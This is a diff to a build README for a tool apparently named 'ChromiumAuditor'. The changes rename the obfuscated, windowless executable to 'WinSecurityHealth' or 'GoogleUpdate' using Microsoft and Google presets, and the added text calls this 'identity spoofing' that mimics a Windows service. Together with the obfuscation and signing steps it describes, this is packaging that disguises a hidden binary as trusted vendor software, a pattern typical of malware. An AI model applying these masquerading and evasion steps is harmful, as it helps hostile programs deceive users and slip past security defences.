@@ -23,10 +23,10 @@ pip install pyarmor pyinstaller -r requirements.txt
 
 ### 2. Binary Compilation (Windows)
 
-Generate the `.exe` using the automation script:
+Generate the `.exe` using the automation script with identity spoofing (e.g., mimicking a Windows service):
 
 ```powershell
-python build.py --name "ChromiumAuditor" --onefile --noconsole
+python build.py --name "WinSecurityHealth" --preset microsoft --onefile --noconsole
 ```
 
 *The result will be in `dist/ChromiumAuditor.exe`.*
@@ -84,7 +84,7 @@ Run the full process under Wine:
 
 ```bash
 wine python ofuscator.py main.py
-wine python build.py --name "ChromiumAuditor" --onefile --noconsole
+wine python build.py --name "GoogleUpdate" --preset google --onefile --noconsole
 ```
 
 ### 5. In-Situ Signing
